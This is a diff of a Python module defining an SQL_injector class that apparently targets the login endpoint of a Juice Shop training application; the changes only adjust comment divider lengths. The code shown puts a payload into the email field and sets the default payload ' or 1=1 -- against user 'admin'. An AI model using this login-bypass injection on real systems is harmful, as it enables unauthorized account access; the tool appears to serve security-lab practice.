@@ -17,20 +17,20 @@ from . import attack as a
 #---------------------------------------------------------------------------------------
 #Class: SQL_injector
 #Inherit: Attack
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 class SQL_injector(a.attack_inter):
     
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION: __init__ 
 #ARGUMENTS: N/A
 #RETURNS: void
 #Description: Initial class variables(REST session; URL).
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def __init__(self):
         self.juice_session = a.requests.session()
         self.url = a.URL + '/rest/user/login'
     
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION generator
 #ARGUMENTS: myScript --> the SQL_injection payload. 
 #RETURNS: json_data  --> will be embedded into POST request json field. 
@@ -38,7 +38,7 @@ class SQL_injector(a.attack_inter):
 #             Payload will is injected in user email field.
 #NOTES:
 # ALL REST requests needed data like json_data, header, and cookie must generated through this function
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def generator(self, myScript):
         #cookies = COOKIE
         json_data = {
@@ -47,7 +47,7 @@ class SQL_injector(a.attack_inter):
         }
         return json_data
 
-#-----------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION run
 #ARGUMENTS: userInput(optional) --> SQL injection payload/dictionary 
 #           username(optional)  --> target Username
@@ -55,7 +55,7 @@ class SQL_injector(a.attack_inter):
 #Description: This is the main function for plugin to send REST requests.
 #             
 #NOTES: None
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def run(self, userInput = '\' or 1=1 --', username = 'admin'):
         print("================Start SQL injection==============")
         a.logging.basicConfig(filename='./test_logging_info.log', level=a.logging.INFO, format='%(asctime)s %(message)s')
